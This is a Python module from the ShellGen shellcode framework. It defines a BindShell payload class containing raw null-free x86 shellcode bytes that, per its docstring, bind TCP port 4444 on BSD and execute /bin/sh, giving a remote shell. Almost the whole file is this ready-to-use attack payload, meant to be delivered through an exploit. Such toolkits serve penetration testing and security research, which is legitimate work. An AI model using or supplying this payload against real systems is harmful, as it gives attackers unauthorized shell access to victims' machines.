#!/usr/bin/env python

###############################################################################
## Bind to TCP port 4444 and execute /bin/sh in BSD/x86                      ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to TCP port 4444 and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Static

class BindShell (Static):
    """
    "Bind to TCP port 4444 and execute /bin/sh in BSD/x86.

    Based on original code by pancake from 48bits:
    `<http://radare.org/y/>`_
    """

    qualities = "payload"
    encoding  = "nullfree"

    address = "0.0.0.0"
    port = 4444

    bytes = (
        "\x31\xc9\x83\xe9\xec\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xce"
        "\xd3\x61\x53\x83\xeb\xfc\xe2\xf4\xa4\xb2\x39\xca\x9c\xbb\x71\x51"
        "\xdf\x8f\xe8\xb2\x9c\x91\x33\x11\x9c\xb9\x71\x9e\x4e\x4a\xf2\x02"
        "\x9d\x81\x0b\x3b\x96\x1e\xe1\xe3\xa4\x1e\xe1\x01\x9d\x81\xd1\x4d"
        "\x03\x53\xf6\x39\xcc\x8a\x0b\x09\x96\x82\x36\x02\x03\x53\x28\x2a"
        "\x3b\x83\x09\x7c\xe1\xa0\x09\x3b\xe1\xb1\x08\x3d\x47\x30\x31\x07"
        "\x9d\x80\xd1\x68\x03\x53\x61\x53"
    )
